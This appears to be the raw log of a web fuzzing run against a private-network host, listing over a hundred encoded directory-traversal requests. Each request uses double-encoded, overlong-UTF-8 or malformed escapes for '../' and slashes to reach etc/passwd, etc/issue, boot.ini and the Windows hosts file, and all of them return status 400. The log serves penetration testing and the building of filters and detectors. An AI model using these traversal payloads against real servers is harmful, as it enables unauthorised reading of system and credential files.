204,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts
203,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfpasswd
202,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfissue
199,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfpasswd
201,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfboot.ini
198,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfissue
58,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fetc%252fissue
197,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfboot.ini
205,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfboot.ini
212,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts
207,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfpasswd
213,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qfboot.ini
206,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfissue
210,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfissue
209,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfboot.ini
214,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qfetc%bg%qfissue
211,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfetc%bg%qfpasswd
59,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252f%%32%%65%%32%%65%252fetc%252fpasswd
222,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fissue
72,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252fwindows%252fsystem32%252fdrivers%252fetc%252fhosts
218,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fissue
220,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
216,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts
223,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fpasswd
221,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fboot.ini
224,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
225,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fboot.ini
215,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qfetc%bg%qfpasswd
226,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fissue
69,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252fboot.ini
235,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fpasswd
234,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fissue
233,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fboot.ini
231,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fpasswd
232,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
229,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fboot.ini
227,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fetc%c0%2fpasswd
101,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25af%%32%%65%%32%%65%25c0%25afboot.ini
70,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252fetc%252fissue
242,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cissue
240,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
239,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2fetc%c0%2fpasswd
241,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cboot.ini
243,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cpasswd
238,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2fetc%c0%2fissue
244,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts
236,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2f%%32%%65%%32%%65%c0%2fwindows%c0%2fsystem32%c0%2fdrivers%c0%2fetc%c0%2fhosts
237,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%2fboot.ini
196,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts
254,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cissue
255,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cpasswd
256,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts
258,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cissue
96,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
259,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cpasswd
260,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts
261,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5cboot.ini
262,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5cetc%c0%5cissue
263,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5cetc%c0%5cpasswd
264,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts
265,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vboot.ini
266,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vissue
268,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
71,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%252fetc%252fpasswd
269,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vboot.ini
270,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vissue
271,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vpasswd
272,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
273,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vboot.ini
274,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vissue
253,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cboot.ini
251,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cpasswd
248,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts
245,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cboot.ini
247,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cpasswd
249,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cboot.ini
250,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cissue
246,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cetc%c0%5cissue
252,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5c%%32%%65%%32%%65%c0%5cwindows%c0%5csystem32%c0%5cdrivers%c0%5cetc%c0%5chosts
208,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qf%%32%%65%%32%%65%bg%qfwindows%bg%qfsystem32%bg%qfdrivers%bg%qfetc%bg%qfhosts
280,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
276,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
282,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vissue
281,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vboot.ini
279,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vpasswd
277,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vboot.ini
278,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vissue
285,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9vboot.ini
284,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
283,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9v%%32%%65%%32%%65%c0%9vetc%c0%9vpasswd
286,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9vetc%c0%9vissue
289,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afboot.ini
287,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9vetc%c0%9vpasswd
288,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%9vwindows%c0%9vsystem32%c0%9vdrivers%c0%9vetc%c0%9vhosts
295,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afpasswd
305,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afboot.ini
303,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afpasswd
302,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afissue
291,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afpasswd
304,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
294,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afissue
292,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
290,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afissue
308,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
307,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afpasswd
306,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afissue
297,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afboot.ini
296,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
299,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afpasswd
298,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afetc%c0%afissue
293,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afboot.ini
301,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afboot.ini
300,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%af%%32%%65%%32%%65%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
309,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%afboot.ini
316,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
319,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfpasswd
320,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
321,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfboot.ini
322,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfissue
310,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%afetc%c0%afissue
315,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfpasswd
312,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%afwindows%c0%afsystem32%c0%afdrivers%c0%afetc%c0%afhosts
311,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%afetc%c0%afpasswd
324,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
325,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfboot.ini
329,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfboot.ini
330,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfissue
326,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfissue
327,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfpasswd
328,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
331,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfpasswd
323,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfetc%c0%qfpasswd
334,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qfetc%c0%qfissue
335,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qfetc%c0%qfpasswd
332,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qf%%32%%65%%32%%65%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
343,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cetc%c1%1cpasswd
336,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qfwindows%c0%qfsystem32%c0%qfdrivers%c0%qfetc%c0%qfhosts
333,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c0%qfboot.ini
341,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cboot.ini
342,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cetc%c1%1cissue
338,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cetc%c1%1cissue
340,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cwindows%c1%1csystem32%c1%1cdrivers%c1%1cetc%c1%1chosts
339,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cetc%c1%1cpasswd
337,400,10L,35W,http://192.168.0.15/%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1c%%32%%65%%32%%65%c1%1cboot.ini
